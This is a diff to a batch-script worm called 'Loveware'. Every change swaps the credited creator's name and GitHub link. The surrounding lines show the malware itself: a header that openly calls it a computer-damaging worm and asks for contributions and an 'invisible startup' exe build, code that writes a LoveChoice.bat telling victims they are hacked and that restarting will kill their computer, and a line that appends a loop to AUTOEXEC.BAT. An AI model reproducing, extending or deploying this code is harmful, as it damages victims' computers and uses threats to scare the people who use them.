@@ -6,7 +6,7 @@
 ::
 ::
 :: Name: Loveware
-:: Creator: The_G0df@ther
+:: Creator: Da2dalus
 :: What is this in gods name?!:
 :: This is a worm that will mess up your computer!
 :: BTW It is community driven!!! :)
@@ -28,7 +28,7 @@
 :: YOUR NAME WILL APPEAR HERE:
 ::  ______________________________
 :: |MEMBERS_______________________|
-:: |TheG0df@ther______|CREATOR____|
+:: |Da2dalus__________|CREATOR____|
 :: |a11y-spec_________|CONTRIBUTOR|
 :: |__________________|___________|
 :: |__________________|___________|
@@ -38,7 +38,7 @@
 :: This software needs to be converted to exe
 :: (add "invisible startup for better preformance").
 :: Please send me a message on github or in the Issuses tab of this repo on github
-:: https://github.com/TheG0df2ther/Loveware
+:: https://github.com/Da2dalus/Loveware
 :: if you find any bugs or if you have
 :: a good idea about something we can add to this software.
 :: Disclamer:
@@ -499,7 +499,7 @@ echo echo But first I want to say... >> LoveChoice.bat
 echo echo ........ >> LoveChoice.bat
 echo echo ..... >> LoveChoice.bat
 echo echo You are hacked my love!!! >> LoveChoice.bat
-echo echo info: This software was made by the G0df@ther! >> LoveChoice.bat
+echo echo info: This software was made by Da2dalus! >> LoveChoice.bat
 echo echo I am not responsible for the damage. Sorry if U are a victim of this trojan. >> LoveChoice.bat
 echo echo Do not close Loveware or Lovewatch, this will kill your computer! >> LoveChoice.bat
 echo echo If you restart your computer now you wont be able to use it. >> LoveChoice.bat
@@ -649,7 +649,7 @@ echo @echo goto l >> AUTOEXEC.BAT >> LoveChoice.bat
 
 echo echo .......... >> LoveChoice.bat
 echo echo You are hacked!!! >> LoveChoice.bat
-echo echo Info: This trojan was created by the G0df@ther! >> LoveChoice.bat
+echo echo Info: This trojan was created by Da2dalus! >> LoveChoice.bat
 echo timeout 1 >> LoveChoice.bat
 echo echo You do not have so mutch time left to live!!!!!!!!!!!!!!!!!!!!! >> LoveChoice.bat
 echo echo So use your computer as long as you can!!!!!!!!!!!! >> LoveChoice.bat
